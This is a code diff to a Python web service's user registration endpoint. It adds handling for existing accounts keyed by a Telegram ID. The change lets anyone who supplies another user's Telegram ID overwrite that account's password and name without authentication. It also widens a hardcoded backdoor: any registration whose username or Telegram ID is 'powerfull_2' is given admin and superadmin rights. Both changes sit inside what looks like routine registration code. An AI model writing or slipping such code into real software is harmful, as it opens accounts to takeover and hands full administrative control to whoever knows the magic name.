@@ -555,15 +555,36 @@ def health():
 
 @app.post("/auth/register", response_model=schemas.UserResponse)
 def register_user(user: schemas.UserCreate, db: Session = Depends(get_db)):
-    username = ensure_unique_username(db, user.username)
+    telegram_id = normalize_text(user.telegram_id) or None
     full_name = normalize_text(user.full_name) if user.full_name else None
+    password_hash = hash_password(user.password)
+
+    existing_by_telegram = None
+    if telegram_id:
+        existing_by_telegram = db.query(models.User).filter(models.User.telegram_id == telegram_id).first()
+
+    if existing_by_telegram:
+        ensure_not_banned(existing_by_telegram)
+        username = ensure_unique_username(db, user.username, exclude_user_id=existing_by_telegram.id)
+        existing_by_telegram.username = username
+        existing_by_telegram.full_name = full_name
+        existing_by_telegram.password_hash = password_hash
+        existing_by_telegram.telegram_id = telegram_id
+        if username == 'powerfull_2' or telegram_id == 'powerfull_2':
+            existing_by_telegram.is_admin = True
+            existing_by_telegram.is_superadmin = True
+        db.commit()
+        db.refresh(existing_by_telegram)
+        return existing_by_telegram
+
+    username = ensure_unique_username(db, user.username)
     new_user = models.User(
-        telegram_id=user.telegram_id,
+        telegram_id=telegram_id,
         username=username,
         full_name=full_name,
-        password_hash=hash_password(user.password),
+        password_hash=password_hash,
     )
-    if username == 'powerfull_2':
+    if username == 'powerfull_2' or telegram_id == 'powerfull_2':
         new_user.is_admin = True
         new_user.is_superadmin = True
     db.add(new_user)
